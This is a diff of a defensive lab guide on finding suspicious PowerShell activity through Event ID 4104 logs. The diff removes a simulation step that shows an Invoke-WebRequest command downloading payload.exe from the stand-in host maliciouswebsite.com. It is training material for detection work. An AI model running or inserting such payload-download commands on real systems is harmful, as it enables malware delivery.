@@ -66,19 +66,9 @@ This command will list the local users on your system, which attackers might use
  - PowerShell command that was executed
  - User who ran the command
  - Timestamp of the execution
+  
 
-### **Step 3: Simulate Malicious PowerShell Command**
-1. Open PowerShell and run the following suspicious command that might be used by an attacker:
-
-```
-Invoke-WebRequest -Uri "http://maliciouswebsite.com/payload.exe" -OutFile "C:\temp\payload.exe"`
-```
-This command simulates downloading a malicious payload from a remote server.    
-2. Go back to Event Viewer and filter the PowerShell logs for Event ID 4104.     
-3. Check for any suspicious activity or abnormal PowerShell command execution, specifically focusing on the `Invoke-WebRequest` or any network-based PowerShell command.    
-4. Take a screenshot of the event details.     
-
-### **Step 4: Analyze Suspicious PowerShell Logs**
+### **Step 3: Analyze Suspicious PowerShell Logs**
 - Hunt for suspicious script executions from unknown sources or non-standard paths.
 - Correlate user activity with system behavior like file downloads or binary execution.
 - Inspect Event ID 4104 for odd commands, encoded scripts, or known attack patterns.
@@ -90,4 +80,3 @@ This command simulates downloading a malicious payload from a remote server.
 
 ## Submission:
 - Event ID 4104 (PowerShell Script Execution): Submit a screenshot showing a PowerShell script execution event from the logs.
-- Malicious PowerShell Command: Submit a screenshot showing the execution of a suspicious or malicious PowerShell command.
